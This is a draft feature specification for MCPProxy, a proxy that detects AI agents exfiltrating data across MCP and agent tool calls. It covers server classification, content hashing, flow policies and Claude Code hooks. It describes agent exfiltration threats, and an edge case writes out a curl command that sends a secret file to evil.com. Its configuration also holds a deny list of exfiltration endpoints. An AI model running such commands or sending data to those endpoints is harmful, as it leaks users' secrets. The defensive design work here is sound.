# Feature Specification: Data Flow Security with Agent Hook Integration

**Feature Branch**: `027-data-flow-security`
**Created**: 2026-02-04
**Status**: Draft
**Input**: User description: "Data flow security — server/tool classification, content hashing, data flow tracking, policy enforcement, and agent hook integration for detecting lethal trifecta exfiltration patterns. Hooks are optional; MCPProxy must function as a firewall for any MCP-based agent with or without hooks installed."

## Problem Statement

MCPProxy acts as a firewall for AI agents using the Model Context Protocol. Any agent — Claude Code, OpenClaw, Goose, Claude Agent SDK-based bots, or custom MCP clients — routes tool calls through MCPProxy. Today, MCPProxy sees all MCP tool calls but cannot detect cross-tool data exfiltration because it lacks context about data flow direction: which tools read private data and which tools send data externally.

The "lethal trifecta" — an agent with access to private data, exposure to untrusted content, and external communication capability — is the #1 agentic security threat. MCPProxy must detect `internal→external` data movement at the MCP proxy layer, without requiring any agent-side changes.

**Two operating modes** address the full spectrum:

1. **Proxy-only mode (no hooks)**: MCPProxy classifies upstream servers, tracks content hashes across MCP tool calls, and detects exfiltration patterns within MCP traffic. Works with any agent that connects via MCP. Reduced visibility into agent-internal tools (`Read`, `Bash`, `WebFetch`) but still catches MCP-to-MCP exfiltration (e.g., data from `github:get_file` sent to `slack:post_message`).

2. **Hook-enhanced mode (optional)**: Agents with hook support (currently Claude Code; future: Cursor, Gemini CLI, Claude Agent SDK) install hooks that give MCPProxy visibility into internal tool calls too. This closes the visibility gap — the system can detect `Read` → `WebFetch` exfiltration patterns that proxy-only mode cannot see.

The system MUST nudge users to install hooks (via `mcpproxy doctor` and web UI) but MUST NOT require them.

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Detect Exfiltration via MCP Proxy (No Hooks) (Priority: P1)

An autonomous agent (OpenClaw, Goose, or any MCP client) uses MCPProxy to access multiple upstream servers. The agent retrieves data from an internal server (e.g., `github:get_file_contents` returning source code with embedded secrets), then attempts to send that data to an external server (e.g., `slack:post_message`). MCPProxy detects the cross-server data flow at the proxy layer and blocks the exfiltration.

**Why this priority**: This works with every MCP agent without any agent-side changes. The proxy layer is the universal interception point.

**Independent Test**: Can be fully tested by sending MCP tool call sequences through the proxy and verifying flow detection and policy decisions. No hooks needed.

**Acceptance Scenarios**:

1. **Given** an agent calls `call_tool_read` with `name: "github:get_file"` and receives a response containing an AWS secret key, **When** the agent calls `call_tool_write` with `name: "slack:post_message"` and the message body contains that key, **Then** MCPProxy blocks the call with a "deny" decision with reason "Sensitive data (api_token) flowing from internal source (github) to external destination (slack)."
2. **Given** an agent calls `call_tool_read` on an internal database server and receives non-sensitive data, **When** the agent sends a summary of that data to an external webhook server, **Then** MCPProxy flags the flow as `internal→external` with risk level "medium" and returns an "ask" decision.
3. **Given** an agent calls `call_tool_read` on one internal server and then `call_tool_write` on another internal server, **When** the flow is analyzed, **Then** MCPProxy classifies it as `internal→internal` with risk level "none" and allows it.
4. **Given** no hooks are installed, **When** an agent calls MCP tools, **Then** MCPProxy still tracks data flow across MCP tool calls and enforces policies (reduced visibility into agent-internal tools is expected and documented).

---

### User Story 1b - Detect Exfiltration with Hook Enhancement (Priority: P1)

A developer using Claude Code with hooks installed gains full visibility. The agent reads a file containing API keys via the `Read` tool (visible through hooks), then attempts to send that data to an external URL via `WebFetch` (also visible through hooks). MCPProxy detects the `internal→external` flow and blocks it.

**Why this priority**: Hooks provide the deepest visibility — catching exfiltration patterns that proxy-only mode cannot see (agent-internal tool chains).

**Independent Test**: Can be tested by replaying a deterministic sequence of hook events (PostToolUse for Read → PreToolUse for WebFetch with matching content) and verifying the system returns a "deny" decision.

**Acceptance Scenarios**:

1. **Given** hooks are installed and an agent reads a file containing an AWS secret key via `Read`, **When** the agent attempts to send that key's value to an external URL via `WebFetch`, **Then** MCPProxy blocks the call and returns a "deny" decision.
2. **Given** hooks are installed and an agent reads a file containing a database connection string, **When** the agent attempts to exfiltrate it via `Bash` with a `curl` command, **Then** MCPProxy blocks the call with a "deny" decision.
3. **Given** hooks are NOT installed, **When** an agent uses `Read` → `WebFetch` exfiltration, **Then** MCPProxy does NOT detect this flow (expected behavior — `mcpproxy doctor` shows a recommendation to install hooks for improved coverage).

---

### User Story 2 - Classify Servers and Tools (Priority: P1)

A developer configures MCPProxy with multiple upstream servers (GitHub, Slack, database). MCPProxy automatically classifies each server and tool as internal (data source) or external (communication channel) using name-based heuristics, and allows administrators to override classifications via configuration.

**Why this priority**: Classification is the foundation for all flow analysis. Without knowing which tools are internal vs external, the system cannot determine flow direction.

**Independent Test**: Can be tested by providing server/tool names and verifying correct classification output without any data flow.

**Acceptance Scenarios**:

1. **Given** an upstream server named "postgres-db", **When** MCPProxy classifies it, **Then** it returns classification "internal" with confidence >= 0.8.
2. **Given** an upstream server named "slack-notifications", **When** MCPProxy classifies it, **Then** it returns classification "external" with confidence >= 0.8.
3. **Given** an agent internal tool named "Read", **When** MCPProxy classifies it, **Then** it returns classification "internal" with `can_read_data: true`.
4. **Given** an agent internal tool named "WebFetch", **When** MCPProxy classifies it, **Then** it returns classification "external" with `can_exfiltrate: true`.
5. **Given** an agent internal tool named "Bash", **When** MCPProxy classifies it, **Then** it returns classification "hybrid" (can be either internal or external depending on command).
6. **Given** a config override `"server_overrides": {"my-private-slack": "internal"}`, **When** MCPProxy classifies server "my-private-slack", **Then** it returns "internal" regardless of heuristic match, with method "config".

---

### User Story 3 - Install Hook Integration via CLI (Priority: P2)

A developer installs MCPProxy hook integration into their Claude Code environment by running a single CLI command. The command generates the appropriate hook configuration and writes it to the Claude Code settings file. No API keys or port numbers are embedded in any files — communication happens via Unix socket. Hook installation is optional — the system works without hooks but with reduced coverage.

**Why this priority**: P2 because the core proxy-only flow detection (Story 1) works without hooks. Hooks are an enhancement that improves coverage for agent-internal tools. The system should nudge users to install them but never require them.

**Independent Test**: Can be tested by running the install command and verifying the generated settings file contains correct hook configuration pointing to `mcpproxy hook evaluate`.

**Acceptance Scenarios**:

1. **Given** mcpproxy binary is installed and in PATH, **When** the developer runs `mcpproxy hook install --agent claude-code --scope project`, **Then** the file `.claude/settings.json` is created/updated with PreToolUse and PostToolUse hook configurations.
2. **Given** hook configuration is installed, **When** Claude Code starts a session and the agent calls any tool, **Then** the hook script executes `mcpproxy hook evaluate` which communicates with the running mcpproxy daemon via Unix socket.
3. **Given** mcpproxy daemon is not running, **When** a hook fires, **Then** `mcpproxy hook evaluate` fails open (returns "allow") so the agent is not blocked by infrastructure issues.
4. **Given** hook configuration is installed, **When** the developer runs `mcpproxy hook status`, **Then** the CLI shows which hooks are installed, for which agent, and whether the daemon is reachable.
5. **Given** hook configuration is installed, **When** the developer runs `mcpproxy hook uninstall`, **Then** the hook entries are removed from the Claude Code settings file.

---

### User Story 4 - Evaluate Tool Calls via Hook Endpoint (Priority: P1)

When an agent tool call triggers a hook, `mcpproxy hook evaluate` reads the hook payload from stdin, sends it to the mcpproxy daemon via Unix socket, and returns the security decision in the format expected by the agent (Claude Code hook protocol).

**Why this priority**: This is the runtime evaluation path — the mechanism through which all security decisions flow.

**Independent Test**: Can be tested by sending a JSON payload to the `/api/v1/hooks/evaluate` endpoint and verifying the response structure and decision.

**Acceptance Scenarios**:

1. **Given** a PreToolUse event for `Read` with `file_path: "/home/user/.env"`, **When** the hook endpoint evaluates it, **Then** it returns `{decision: "allow"}` (reading is allowed; data will be tracked as origin after PostToolUse).
2. **Given** a PostToolUse event for `Read` with response containing sensitive data, **When** the hook endpoint processes it, **Then** it records the response content hashes as data origins in the flow session.
3. **Given** a PreToolUse event for `WebFetch` with a URL containing data that matches a previously recorded origin hash, **When** the hook endpoint evaluates it, **Then** it returns `{decision: "deny", risk_level: "critical", reason: "..."}`.
4. **Given** a PreToolUse event for a tool but mcpproxy daemon is unreachable via socket, **When** `mcpproxy hook evaluate` runs, **Then** it returns exit code 0 with `permissionDecision: "allow"` (fail open).
5. **Given** a PreToolUse event, **When** the hook endpoint evaluates it, **Then** the evaluation completes and returns a response within 100 milliseconds.

---

### User Story 5 - Correlate Hook Sessions with MCP Sessions (Priority: P2)

When Claude Code calls MCP tools through mcpproxy, the system automatically links the Claude Code hook session to the MCP session using argument hash matching. This enables a unified flow graph that includes both internal tool calls and MCP tool calls.

**Why this priority**: Session correlation enriches the flow graph but is not strictly required for the core exfiltration detection (which works within the hook session alone). It adds value by providing cross-boundary visibility.

**Independent Test**: Can be tested by sending a hook PreToolUse for `mcp__mcpproxy__call_tool_read` followed by a matching MCP tool call, and verifying the sessions are linked.

**Acceptance Scenarios**:

1. **Given** a PreToolUse hook fires for `mcp__mcpproxy__call_tool_read` with `tool_input.name: "github:get_file"` and `session_id: "cc-session-abc"`, **When** an MCP `call_tool_read` request arrives at mcpproxy with `name: "github:get_file"` and identical arguments, **Then** the MCP session is linked to hook session "cc-session-abc".
2. **Given** sessions are linked, **When** subsequent MCP tool calls arrive on the same MCP session, **Then** they are automatically attributed to the linked hook flow session.
3. **Given** two Claude Code sessions connect to mcpproxy simultaneously, **When** each makes different tool calls, **Then** each MCP session is linked to the correct hook session (no cross-contamination).
4. **Given** a pending correlation entry older than 5 seconds, **When** a matching MCP call arrives, **Then** the stale entry is ignored and no correlation is established (TTL expiry).

---

### User Story 6 - Enforce Configurable Flow Policies (Priority: P2)

Administrators can configure policies that determine how MCPProxy responds to different data flow patterns. Policies control whether flows are allowed, flagged for user confirmation, or denied.

**Why this priority**: Default policies cover most cases, but enterprise users need customization for their specific security requirements.

**Independent Test**: Can be tested by configuring different policies and replaying the same flow scenario, verifying different decisions are returned.

**Acceptance Scenarios**:

1. **Given** policy `internal_to_external: "ask"`, **When** an `internal→external` flow is detected without sensitive data, **Then** the system returns decision "ask".
2. **Given** policy `sensitive_data_external: "deny"`, **When** sensitive data flows from internal to external, **Then** the system returns decision "deny".
3. **Given** policy `tool_overrides: {"WebSearch": "allow"}`, **When** the agent uses `WebSearch`, **Then** the system always returns "allow" regardless of flow analysis.
4. **Given** a URL matching the `suspicious_endpoints` list (e.g., `webhook.site`), **When** any data is sent to it, **Then** the system returns "deny" regardless of other policy settings.

---

### User Story 7 - Log Hook Events in Activity Log (Priority: P2)

All hook evaluations are logged as activity records, enabling security teams to review, filter, and export hook-related events alongside MCP tool call activity.

**Why this priority**: Audit trail is essential for post-incident forensics and compliance, but the system provides value even without persistent logging.

**Independent Test**: Can be tested by sending hook events and querying the activity log API for hook_evaluation records.

**Acceptance Scenarios**:

1. **Given** a hook evaluation occurs, **When** querying the activity log, **Then** a record of type "hook_evaluation" appears with tool name, classification, flow analysis, and policy decision.
2. **Given** multiple hook events with different risk levels, **When** filtering by `--risk-level high`, **Then** only high and critical risk events are returned.
3. **Given** hook events in the activity log, **When** exporting via `mcpproxy activity export --include-flows`, **Then** the export includes flow analysis metadata.

---

### User Story 8 - Content Hashing for Flow Detection (Priority: P1)

MCPProxy uses content hashing to detect when data from one tool call appears in another tool call's arguments. Hashing operates at multiple granularities (full content and per-field) to catch both exact matches and partial data reuse.

**Why this priority**: Content hashing is the mechanism that makes flow detection work. Without it, the system cannot determine that data has moved between tool calls.

**Independent Test**: Can be tested by hashing tool responses and verifying matches when the same data appears in subsequent tool arguments.

**Acceptance Scenarios**:

1. **Given** a tool response containing the string "sk-proj-abc123def456", **When** the same string appears in a subsequent tool call's arguments, **Then** the system detects a content hash match and creates a flow edge.
2. **Given** a tool response with a JSON object containing multiple fields, **When** a single field value (>= 20 characters) appears in a subsequent call, **Then** the per-field hash matches even though the full content hash does not.
3. **Given** a tool response with a short string (< 20 characters), **When** the same string appears elsewhere, **Then** no hash match is created (short strings produce too many false positives).
4. **Given** data that has been lightly reformatted (leading/trailing whitespace, case changes), **When** normalized hashing is applied, **Then** the system still detects the match.

---

### User Story 9 - Graceful Degradation Without Hooks (Priority: P1)

MCPProxy provides meaningful security even when no hooks are installed. Users who connect any MCP agent (OpenClaw, Goose, custom bots) get automatic server classification, cross-server data flow tracking, and policy enforcement at the MCP proxy layer. The system clearly communicates what coverage level is active and what hooks would add.

**Why this priority**: MCPProxy must be useful as a firewall for all agents, not just Claude Code. Most autonomous agents (OpenClaw, Goose) have no hook system at all.

**Independent Test**: Can be tested by running MCP tool calls through the proxy with hooks disabled and verifying that proxy-level flow detection works correctly, while hook-dependent features are clearly reported as unavailable.

**Acceptance Scenarios**:

1. **Given** no hooks are installed, **When** MCP tool calls flow through the proxy, **Then** the system tracks data origins from `call_tool_read` responses and checks `call_tool_write`/`call_tool_destructive` arguments against recorded origins.
2. **Given** no hooks are installed, **When** the user runs `mcpproxy doctor`, **Then** the output includes a recommendation: "Install agent hooks for improved security coverage. Hooks provide visibility into agent-internal tools (Read, Bash, WebFetch). Without hooks, flow detection is limited to MCP-proxied tool calls. Run `mcpproxy hook install --agent claude-code` to enable."
3. **Given** no hooks are installed, **When** the user views the web UI dashboard, **Then** a non-blocking banner shows: "Security coverage: MCP proxy only. Install hooks for full agent tool visibility." with a link to instructions.
4. **Given** hooks ARE installed, **When** the user runs `mcpproxy doctor`, **Then** the hooks section shows "Hooks: active" with the connected agent type and session count. No nudge is shown.
5. **Given** no hooks are installed, **When** querying the `/api/v1/status` endpoint, **Then** the response includes a `security_coverage` field indicating "proxy_only" (vs "full" when hooks are active).

---

### User Story 10 - Unified Activity Log for Flow Data (Priority: P2)

All flow-related events (hook evaluations, flow alerts, flow session summaries) are stored as activity records in the existing unified activity log. When a flow session expires, a summary record is written capturing aggregate flow statistics. This provides a single queryable data source for security auditing.

**Why this priority**: A unified log enables the future auditor agent to consume all security telemetry from one source. It also avoids the complexity of maintaining a separate flow database.

**Independent Test**: Can be tested by creating flow sessions, letting them expire, and querying the activity log for `flow_summary` records.

**Acceptance Scenarios**:

1. **Given** a flow session exists with detected flows, **When** the session expires (30 minutes of inactivity), **Then** a `flow_summary` activity record is written containing: session duration, total origins tracked, total flow edges detected, flow type distribution, risk level distribution, linked MCP sessions, and tools used.
2. **Given** flow summary records exist, **When** querying the activity log with `--type flow_summary`, **Then** only flow summary records are returned.
3. **Given** both `hook_evaluation` and `flow_summary` records exist, **When** querying with `--session-id <id>`, **Then** all records for that session are returned in chronological order (tool calls, hook evaluations, and flow summary).

---

### User Story 11 - Auditor Agent Data Surface (Priority: P3)

MCPProxy's activity log and REST API provide a complete data surface for an external AI auditor agent to consume. The auditor can query historical activity, subscribe to real-time events, and export data for batch analysis — all through existing interfaces.

**Why this priority**: P3 because the auditor itself is a future feature, but the data surface must be designed now to avoid retrofitting later.

**Independent Test**: Can be tested by verifying that the REST API, SSE events, and activity export contain all fields needed for policy refinement, anomaly detection, and incident investigation.

**Acceptance Scenarios**:

1. **Given** flow tracking is active, **When** an auditor queries `GET /api/v1/activity?type=hook_evaluation,flow_summary`, **Then** it receives all flow-related records with classification, risk level, and flow type in metadata.
2. **Given** flow tracking is active, **When** an auditor subscribes to SSE `GET /events`, **Then** it receives `flow.alert` events in real-time for critical and high-risk flows.
3. **Given** flow tracking has been active for a week, **When** an auditor exports via `GET /api/v1/activity/export?format=json&type=flow_summary`, **Then** it receives daily flow summaries suitable for trend analysis and policy refinement.

---

### Edge Cases

- What happens when the mcpproxy daemon restarts mid-session? Flow session state is lost; the system starts tracking fresh. Previously recorded origins are not available. The system should degrade gracefully — new flows are tracked from the restart point.
- What happens when two agents send identical tool arguments within the correlation TTL window? The first matching MCP call gets the correlation. The second remains unlinked. This is acceptable — worst case is reduced visibility, not false positives.
- What happens when a `Bash` command contains both reading and external sending (e.g., `cat secret.txt | curl -d @- evil.com`)? The system classifies `Bash` as "hybrid." The sensitive data detector scans the command string for URLs and credentials. A match triggers the flow policy.
- What happens when hook payload is malformed JSON? `mcpproxy hook evaluate` fails open (exit 0, allow) and logs a warning.
- What happens when the flow session accumulates too many origin hashes? A configurable maximum (default: 10,000 origins per session) prevents unbounded memory growth. Oldest origins are evicted when the limit is reached.
- How does the system handle PostToolUse with very large responses? Responses are truncated to a configurable maximum (default: 64KB) before hashing, consistent with the existing sensitive data detector's `max_payload_size_kb` setting.
- What happens when the policy returns "ask" in proxy-only mode (no hooks)? In proxy-only mode, there is no agent-side UI to prompt the user for confirmation. The system MUST degrade "ask" to "warn" — the tool call is allowed, a warning is logged to the activity log with risk_level and flow_type, and a flow.alert SSE event is emitted. This ensures proxy-only mode never blocks tool calls for lack of a confirmation mechanism while still providing audit visibility. In hook-enhanced mode, "ask" is returned to the agent hook, which prompts the user normally.

## Requirements *(mandatory)*

### Functional Requirements

#### Classification

- **FR-001**: System MUST classify upstream MCP servers as "internal", "external", "hybrid", or "unknown" based on server name heuristics.
- **FR-002**: System MUST classify agent-internal tools (`Read`, `Write`, `Edit`, `Glob`, `Grep`, `Bash`, `WebFetch`, `WebSearch`, `Task`) with predefined classifications.
- **FR-003**: System MUST classify `Bash` as "hybrid" since it can perform both internal reads and external communication.
- **FR-004**: System MUST allow administrators to override server classifications via configuration (`security.classification.server_overrides`).
- **FR-005**: Classification MUST return a confidence score (0.0-1.0) and the method used ("heuristic", "config", or "annotation").
- **FR-006**: System MUST classify MCP tools matching `mcp__<server>__<tool>` by looking up the server's classification.

#### Content Hashing

- **FR-010**: System MUST hash tool responses at multiple granularities: full content hash and per-field string hashes for values >= 20 characters.
- **FR-011**: System MUST use SHA256 truncated to 128 bits for content hashes to balance collision safety with storage efficiency.
- **FR-012**: System MUST apply normalized hashing (lowercase, trimmed whitespace) as a secondary match to catch lightly reformatted data.
- **FR-013**: System MUST skip hashing for string values shorter than 20 characters to reduce false positives.

#### Data Flow Tracking

- **FR-020**: System MUST maintain per-session flow state tracking data origins (which tool produced data) and flow edges (data movement between tools).
- **FR-021**: System MUST record PostToolUse response content hashes as data origins, tagged with tool classification.
- **FR-022**: System MUST check PreToolUse arguments against recorded origins to detect cross-boundary data flow.
- **FR-023**: System MUST classify detected flows into four types: `internal→internal` (safe), `external→external` (safe), `external→internal` (safe), `internal→external` (critical).
- **FR-024**: System MUST assign risk levels to detected flows: "none" for safe flows, "medium" for `internal→external` without sensitive data, "high" for unjustified `internal→external`, "critical" for `internal→external` with sensitive data.
- **FR-025**: System MUST expire flow sessions after a configurable inactivity timeout (default: 30 minutes).
- **FR-026**: System MUST limit per-session origin storage to a configurable maximum (default: 10,000 entries) to prevent unbounded memory growth.

#### Proxy-Only Flow Tracking (No Hooks Required)

- **FR-027**: System MUST track data flow at the MCP proxy layer by recording `call_tool_read` response hashes as data origins and checking `call_tool_write`/`call_tool_destructive` arguments against those origins. This MUST work without any agent hooks installed.
- **FR-028**: System MUST use MCP session IDs for proxy-only flow tracking, creating a FlowSession per MCP session when hooks are not available.
- **FR-029**: System MUST report the current security coverage mode ("proxy_only" or "full") in the `/api/v1/status` response and in flow-related activity records.

#### Session Correlation (Mechanism A — Argument Hash Matching)

- **FR-030**: System MUST register pending correlations when a PreToolUse hook event is received for `mcp__mcpproxy__*` tools, recording the hook session ID and a hash of the tool arguments.
- **FR-031**: System MUST attempt to match pending correlations when MCP tool calls arrive in `handleCallToolVariant()`, using argument hash comparison.
- **FR-032**: System MUST permanently link an MCP session to a hook session once a match is found, so all subsequent MCP calls on that session are attributed to the hook flow session.
- **FR-033**: Pending correlation entries MUST expire after a configurable TTL (default: 5 seconds) to prevent stale matches.
- **FR-034**: System MUST handle multiple simultaneous agent sessions without cross-contamination — each hook session correlates to its own MCP session independently.

#### Hook Integration (Optional Enhancement)

- **FR-040**: System MUST expose a `POST /api/v1/hooks/evaluate` HTTP endpoint that accepts hook event payloads and returns security decisions.
- **FR-041**: The hook evaluate endpoint MUST accept `event`, `session_id`, `tool_name`, `tool_input`, and optionally `tool_response` fields.
- **FR-042**: The hook evaluate endpoint MUST return `decision` ("allow", "deny", "ask"), `reason`, `risk_level`, and `activity_id` fields.
- **FR-043**: System MUST provide a `mcpproxy hook evaluate --event <event>` CLI command that reads JSON from stdin, communicates with the daemon via Unix socket, and outputs the decision in the agent's expected hook protocol format.
- **FR-044**: The `mcpproxy hook evaluate` CLI command MUST use a fast startup path — no config file loading, no file logger — to complete within 100ms total.
- **FR-045**: The `mcpproxy hook evaluate` CLI command MUST fail open (return "allow") when the daemon is unreachable, to prevent infrastructure issues from blocking the agent.
- **FR-046**: System MUST provide a `mcpproxy hook install --agent <agent> --scope <scope>` CLI command that generates and writes hook configuration to the appropriate agent settings file.
- **FR-047**: The install command MUST NOT embed API keys, port numbers, or any secrets in generated configuration — communication MUST use Unix socket with OS-level authentication.
- **FR-048**: System MUST provide `mcpproxy hook uninstall` and `mcpproxy hook status` commands.
- **FR-049**: For Claude Code, the PreToolUse hook MUST match `Read|Glob|Grep|Bash|Write|Edit|WebFetch|WebSearch|Task|mcp__.*` to capture both internal and MCP tool calls.
- **FR-050**: For Claude Code, the PostToolUse hook MUST run with `async: true` to avoid blocking the agent (it only records data, never denies).
- **FR-051**: Hook installation MUST be optional. The system MUST function correctly without any hooks installed, providing proxy-level flow detection only.
- **FR-052**: The hook install command MUST be agent-agnostic with `--agent` flag. Initial support: `claude-code`. Future: `cursor`, `gemini-cli`, `claude-agent-sdk`.

#### Nudge and Coverage Reporting

- **FR-080**: `mcpproxy doctor` MUST include a "Security Coverage" section reporting whether hooks are installed, which agent, and the current coverage level.
- **FR-081**: When no hooks are detected, `mcpproxy doctor` MUST display a recommendation explaining the benefit of hooks ("Hooks provide visibility into agent-internal tools like Read, Bash, WebFetch. Without hooks, flow detection is limited to MCP-proxied tool calls.") with the install command.
- **FR-082**: The web UI dashboard MUST display a non-blocking, dismissible banner when hooks are not detected, explaining the coverage improvement hooks provide.
- **FR-083**: The `/api/v1/status` response MUST include `security_coverage` ("proxy_only" or "full") and `hooks_active` (boolean) fields.
- **FR-084**: The `/api/v1/diagnostics` response MUST include a `recommendations` array with hook installation recommendation when hooks are not detected.

#### Activity Log Flow Extension

- **FR-090**: System MUST write a `flow_summary` activity record when a flow session expires, containing: session duration, total origins tracked, total flow edges, flow type distribution, risk level distribution, linked MCP sessions, tools used.
- **FR-091**: The unified activity log MUST support the following record types for flow data: `hook_evaluation` (per-evaluation), `flow_summary` (per-session-expiry), and the future `auditor_finding` (reserved type).
- **FR-092**: Activity log queries MUST support filtering by `--type flow_summary`, `--session-id`, and `--risk-level` across all flow-related record types.

#### Policy Engine

- **FR-060**: System MUST support configurable policy actions for `internal_to_external` flows: "allow", "warn", "ask", or "deny".
- **FR-061**: System MUST support a separate policy for sensitive data flowing externally: `sensitive_data_external` (default: "deny").
- **FR-062**: System MUST support per-tool policy overrides (e.g., always allow `WebSearch`).
- **FR-063**: System MUST support a configurable list of suspicious endpoints (e.g., `webhook.site`, `requestbin.com`) that are always denied.
- **FR-064**: System MUST integrate with the existing sensitive data detector (Spec 026) to determine whether flowing data contains credentials, keys, or other sensitive content.

#### Activity Log Integration

- **FR-070**: System MUST log all hook evaluations as activity records of type "hook_evaluation" in the existing activity log.
- **FR-071**: Hook evaluation activity records MUST include: tool name, classification result, flow analysis, policy decision, risk level, and session IDs.
- **FR-072**: System MUST support filtering activity records by `--type hook_evaluation`, `--flow-type`, and `--risk-level`.

### Key Entities

- **FlowSession**: A per-session container tracking data origins and flow edges. Identified by hook session ID (when hooks active) OR MCP session ID (proxy-only mode). Contains origin map (content hash → source info), flow edges (detected data movements), and linked MCP session IDs.
- **DataOrigin**: A record of where data was produced. Contains content hash, source tool name, server name (if MCP), classification, timestamp, and sensitive data flags.
- **FlowEdge**: A detected data movement between tools. Contains source origin, destination tool, flow type (internal→external, etc.), risk level, and content hash.
- **ClassificationResult**: The outcome of classifying a server or tool. Contains classification (internal/external/hybrid/unknown), confidence, method, and capability flags (can_read_data, can_exfiltrate).
- **PendingCorrelation**: A temporary entry for argument hash matching. Contains hook session ID, argument hash, timestamp, and TTL. Used to link MCP sessions to hook sessions.
- **FlowPolicy**: A set of rules determining how to respond to different flow patterns. Contains actions for each flow type, per-tool overrides, and suspicious endpoint list.
- **FlowSummary**: Written to the activity log when a flow session expires. Contains aggregate statistics: duration, origin count, flow edge count, flow type distribution, risk levels, tools used. Enables post-hoc analysis without persisting full in-memory state.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: The system detects and blocks exfiltration of sensitive data (API keys, credentials, private keys) from internal tools to external destinations with a detection rate of 95% or higher across known attack patterns.
- **SC-002**: The `mcpproxy hook evaluate` CLI command completes end-to-end (stdin read, socket communication, stdout write) in under 100 milliseconds in 95% of invocations, ensuring agent tools are not noticeably delayed.
- **SC-003**: False positive rate for flow alerts on legitimate `internal→external` data movement (e.g., sharing a public code snippet) is below 5%, as measured by the proportion of "ask" decisions that users approve.
- **SC-004**: Hook installation via `mcpproxy hook install` completes in a single command with no manual configuration steps, producing a working integration that can be verified with `mcpproxy hook status`.
- **SC-005**: Session correlation via argument hash matching successfully links hook sessions to MCP sessions for 99% or more of tool calls where the hook fires before the MCP call.
- **SC-006**: All hook evaluations are persisted in the activity log and retrievable via existing CLI and API filters within 2 seconds of the evaluation completing.
- **SC-007**: The system handles 50 or more concurrent hook evaluations per second without degradation, supporting agents that make rapid tool calls.
- **SC-008**: Known exfiltration attack scenarios (lethal trifecta via WebFetch, Bash curl, MCP Slack post) are covered by deterministic test scenarios that run as part of the standard test suite.
- **SC-009**: All test scenarios run in both proxy-only mode (no hooks) and hook-enhanced mode, verifying correct behavior and expected coverage differences.
- **SC-010**: The `mcpproxy doctor` output and web UI dashboard clearly indicate the current security coverage level and provide actionable guidance to improve it.

## Configuration

The feature introduces the following configuration section under `security`:

```json
{
  "security": {
    "flow_tracking": {
      "enabled": true,
      "session_timeout_minutes": 30,
      "max_origins_per_session": 10000,
      "hash_min_length": 20,
      "max_response_hash_bytes": 65536
    },
    "classification": {
      "default_unknown": "internal",
      "server_overrides": {}
    },
    "flow_policy": {
      "internal_to_external": "ask",
      "sensitive_data_external": "deny",
      "require_justification": true,
      "suspicious_endpoints": [
        "webhook.site",
        "requestbin.com",
        "pipedream.net",
        "hookbin.com",
        "beeceptor.com"
      ],
      "tool_overrides": {}
    },
    "hooks": {
      "enabled": true,
      "fail_open": true,
      "correlation_ttl_seconds": 5
    }
  }
}
```

## Assumptions

- Any MCP agent can connect to MCPProxy via HTTP/SSE without agent-side modifications. Proxy-only flow tracking works for all agents.
- For hook-enhanced mode: Claude Code hook payloads include a consistent `session_id` field across all hook events within a session, as documented in the Claude Code hooks guide.
- The mcpproxy daemon is running and reachable via Unix socket when hooks fire. If not, the system fails open.
- The `mcpproxy` binary is available in the user's PATH when hooks execute.
- Content hashing with SHA256 truncated to 128 bits provides sufficient collision resistance for per-session origin tracking (typically < 10,000 entries per session).
- The 5-second TTL for pending correlations is sufficient for the time between a hook PreToolUse event and the corresponding MCP call arriving at mcpproxy (typically < 50ms).
- Claude Code's PostToolUse event provides the `tool_response` field with sufficient content for meaningful hashing.
- The existing sensitive data detector (Spec 026) is available and functional for integration with flow risk assessment.
- Agents like OpenClaw and Goose connect to upstream MCP servers via HTTP/SSE and can be redirected to use MCPProxy's endpoint as the MCP server URL.

## Dependencies

- **Spec 026 (Sensitive Data Detection)**: The flow risk assessment integrates with the existing detector to determine whether flowing data contains credentials or sensitive content.
- **Spec 018 (Intent Declaration)**: The `call_tool_read/write/destructive` variants provide the tool call arguments that are used for session correlation hashing.
- **Spec 016/017 (Activity Log)**: Hook evaluation events are stored as activity records using the existing activity log infrastructure.

## Agent Compatibility

MCPProxy acts as an MCP firewall for any agent that connects via MCP. The following agents have been analyzed for integration:

| Agent | MCP Transport | Hook System | Integration Mode |
|-------|--------------|-------------|-----------------|
| **Claude Code** | HTTP/SSE | PreToolUse/PostToolUse hooks | Proxy + hooks (full coverage) |
| **Claude Agent SDK** | stdio/SSE/HTTP | PreToolUse/PostToolUse hooks | Proxy + hooks (full coverage) |
| **OpenClaw** (clawdbot) | HTTP/SSE via mcporter | None | Proxy-only |
| **Goose** (Block) | stdio/SSE/HTTP | None | Proxy-only |
| **Cursor** | stdio | beforeMCPExecution (future) | Proxy-only (hooks planned) |
| **Gemini CLI** | stdio | BeforeTool/AfterTool (future) | Proxy-only (hooks planned) |
| **Custom MCP clients** | Any | Varies | Proxy-only |

**Universal integration**: Any MCP client can point at MCPProxy's HTTP endpoint. MCPProxy proxies tool calls to upstream servers and applies flow tracking. No agent-side changes needed for proxy-only mode.

**Hook-enhanced integration**: Agents with hook systems can optionally install hooks for visibility into agent-internal tools. This is currently supported for Claude Code and planned for others.

## Future Considerations

- **Flow Justification Field**: Add optional flow declaration fields to `call_tool_write` and `call_tool_destructive` where the agent explains why data is being sent externally. **IMPORTANT**: These MUST use flat key structure (e.g., `flow_justification`, `flow_destination_type`) — NOT nested objects. Nested objects in tool schemas cause parser failures in some agents (Gemini 3 Pro via Antigravity). This was learned from the intent declaration redesign in [#278](https://github.com/smart-mcp-proxy/mcpproxy-go/issues/278), where `intent: { operation_type, ... }` was flattened to `intent_data_sensitivity`, `intent_reason` string parameters to fix cross-agent compatibility.
- **Cursor and Gemini CLI Hook Adapters**: Extend `mcpproxy hook install` to support Cursor (`beforeMCPExecution` hooks) and Gemini CLI (`BeforeTool`/`AfterTool` hooks).
- **AI Auditor Agent**: An autonomous agent that consumes MCPProxy's unified activity log (tool calls, hook evaluations, flow summaries) to provide continuous security improvement. Operates in three modes:
  - **Batch Analyst**: Periodically exports activity data, runs anomaly detection, computes behavioral baselines, suggests policy refinements (e.g., "WebSearch triggered 47 ask decisions, all approved — recommend moving to allow").
  - **Real-Time Monitor**: Subscribes to SSE `flow.alert` events for critical findings.
  - **Interactive Investigator**: Exposed as an MCP server with tools like `investigate_session`, `suggest_policies`, `security_report`. Any agent connected to MCPProxy can query it directly.

  The auditor does NOT need a separate data store — the unified activity log with `hook_evaluation`, `flow_summary`, and future `auditor_finding` record types provides all needed data through existing REST API, activity export, and SSE interfaces.
